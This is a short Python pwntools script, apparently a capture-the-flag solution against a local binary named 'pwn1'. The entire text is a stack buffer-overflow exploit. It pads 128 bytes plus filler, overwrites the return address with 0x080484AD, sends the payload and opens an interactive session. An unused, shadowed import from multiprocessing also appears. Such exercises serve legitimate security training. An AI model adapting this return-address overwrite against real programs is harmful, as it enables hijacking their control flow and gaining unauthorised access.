from multiprocessing import process
from pwn import *

gb = b'a' * 128
gbp = b'a' * 4
gp = b'a' * 8
add = p32(0x080484AD)
msg = gb + gbp + gp + add
p = process("./pwn1")
p.sendline(msg)
p.interactive()